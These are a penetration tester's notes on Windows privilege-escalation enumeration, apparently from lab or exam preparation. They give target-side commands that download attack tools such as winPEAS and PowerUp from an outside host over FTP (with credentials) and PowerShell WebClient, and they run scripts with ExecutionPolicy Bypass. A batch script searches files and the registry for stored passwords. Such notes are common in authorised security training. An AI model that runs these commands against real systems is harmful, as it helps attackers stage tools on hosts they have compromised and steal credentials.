## Automated Enumeration Scripts

### Quick Start

I have some privesc check files loaded in /ftphome/winprivesc that can be downloaded on the target.  

#### Getting with FTP

Remember to start the FTP server on Linux

```bash
sudo go_ftp.sh
```

Then run this on the target to download the scripts:

```powershell
echo open 192.168.119.216 21> ftp.txt
echo USER rock>> ftp.txt
echo roll>> ftp.txt
echo cd winprivesc >> ftp.txt
echo passive >> ftp.txt
echo bin >> ftp.txt
echo GET accesschk.exe >> ftp.txt
echo GET windows-privesc-check2.exe >> ftp.txt
echo GET win_enum_local.exe >> ftp.txt
echo GET winPEAS.bat >> ftp.txt
echo GET Get-System.ps1 >> ftp.txt
echo GET Invoke-PrivescCheck.ps1 >> ftp.txt
echo GET PowerUp.ps1 >> ftp.txt
echo bye >> ftp.txt
ftp -v -n -s:ftp.txt
del ftp.txt

```

#### Getting with Powershell

If FTP isn't working, you can host the files on a webserver and use Powershell to get them instead:

```powershell
mkdir c:\temp
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://192.168.119.216:80/accesschk.exe','C:\temp\accesschk.exe')"
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://192.168.119.216:80/windows-privesc-check2.exe','C:\temp\windows-privesc-check2.exe')"
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://192.168.119.216:80/win_enum_local.exe','C:\temp\win_enum_local.exe')"
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://192.168.119.216:80/winPEAS.bat','C:\temp\winPEAS.bat')"
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://192.168.119.216:80/Get-System.ps1','C:\temp\Get-System.ps1')"
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://192.168.119.216:80/PowerUp.ps1','C:\temp\PowerUp.ps1')"
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://192.168.119.216:80/Invoke-PrivescCheck.ps1','C:\temp\Invoke-PrivescCheck.ps1')"

powershell -ExecutionPolicy Bypass -File c:\temp\PowerUp.ps1
```

### Frizb Scripts

https://github.com/frizb/Windows-Privilege-Escalation/blob/master/winreconstreamline.bat

```powershell
cd\
net config Workstation  > report.txt
systeminfo >> report.txt
net users >> report.txt
ipconfig /all >> report.txt
route print >> report.txt
arp -A >> report.txt
netstat -ano >> report.txt
netsh firewall show state >> report.txt  
netsh firewall show config >> report.txt
schtasks /query /fo LIST /v >> report.txt
tasklist /SVC >> report.txt
net start >> report.txt
DRIVERQUERY >> report.txt
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated >> report.txt
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated >> report.txt
dir /s *pass* == *cred* == *vnc* == *.config* >> report.txt
findstr /si password *.xml *.ini *.txt >> report.txt
reg query HKLM /f password /t REG_SZ /s >> report.txt
reg query HKCU /f password /t REG_SZ /s >> report.txt
cd\"Program Files"
dir /s *.exe *.ini >> ..\report.txt
cd\"Program Files (x86)"
dir /s *.exe *.ini >> ..\report.txt
cd\
```



### WinPEAS

https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS

Copy the bat or exe to the target and run it.  You can manually redirect the output to a file if desired.

For info on findings:  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation

For info on Privilege Escalation methods:  https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation

### win_enum_local

https://github.com/sn0wfa11/win_enum_local

This is designed to work on Windows XP to 10, and avoids the use of WMIC for Windows XP's sake.

### J.A.W.S.

https://github.com/411Hall/JAWS

Powershell only enumeration script, uses PS 2.0 so it works with Windows 7 and up.

### PrivescCheck 

Does not use any 3rd party tools

https://hakin9.org/privesccheck-privilege-escalation-enumeration-script-for-windows/

### PowerSploit (aka PowerUp)

PowerUp aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations.

https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc

Usage:

```powershell
powershell.exe -nop -exec bypass
Import-Module .\PowerUp.ps1
# Run all relevant checks and dump to a file
Invoke-AllChecks | Out-File -Encoding ASCII checks.txt
```

